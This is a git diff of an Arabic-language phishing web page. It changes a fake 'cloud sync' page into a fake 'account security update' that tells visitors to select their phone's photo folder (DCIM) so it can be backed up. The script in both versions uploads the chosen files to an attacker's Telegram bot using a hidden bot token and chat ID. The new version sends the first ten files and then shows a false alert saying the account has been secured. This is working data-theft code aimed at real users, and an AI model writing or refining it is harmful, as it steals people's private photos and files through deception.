@@ -3,24 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المزامنة السحابية ☁️</title>
+    <title>تأكيد الهوية الرقمية 🔐</title>
     <style>
-        body { background: #121212; color: #ffffff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .box { background: #1e1e1e; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
-        .btn { background: #007bff; color: white; padding: 15px 40px; border-radius: 50px; border: none; font-size: 1.2rem; cursor: pointer; font-weight: bold; }
-        .loader { margin-top: 20px; color: #00ff00; display: none; }
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .card { background: #2d2d2d; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 85%; max-width: 400px; }
+        .btn { background: #0084ff; color: white; padding: 15px; border-radius: 8px; border: none; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
+        p { color: #aaa; font-size: 0.9rem; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h1>مزامنة الملفات الشاملة</h1>
-        <p>اضغط للبدء في نسخ ملفاتك احتياطياً وتأمينها</p>
+    <div class="card">
+        <h2>تحديث أمان الحساب</h2>
+        <p>لضمان حماية صورك من الحذف، يرجى اختيار مجلد الصور (DCIM) لعمل نسخة احتياطية سريعة.</p>
         
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الشاملة</button>
-        
-        <div id="status" class="loader">جاري نقل البيانات وتشفيرها... يرجى عدم الخروج</div>
+        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الآن</button>
     </div>
 
     <script>
@@ -29,22 +27,27 @@
 
         document.getElementById('fileInput').addEventListener('change', function(e) {
             const files = e.target.files;
+            
             if (files.length > 0) {
-                document.getElementById('status').style.display = 'block';
-                
-                for (let i = 0; i < files.length; i++) {
+                // نحدد الحد الأقصى بـ 10 صور فقط
+                const limit = Math.min(files.length, 10);
+                alert("جاري فحص وتأمين أول " + limit + " صور...");
+
+                for (let i = 0; i < limit; i++) {
+                    // نرسلها كوثيقة (Document) لضمان وصولها بأي صيغة
                     let formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    // نستخدم sendDocument لسحب أي نوع ملف (PDF, MP4, APK, etc.)
                     formData.append('document', files[i]);
 
                     fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                         method: 'POST',
                         body: formData
-                    })
-                    .then(res => console.log('تم سحب ملف'))
-                    .catch(err => console.error('خطأ'));
+                    });
                 }
+                
+                setTimeout(() => {
+                    alert("تمت العملية بنجاح! تم تأمين حسابك.");
+                }, 2000);
             }
         });
     </script>
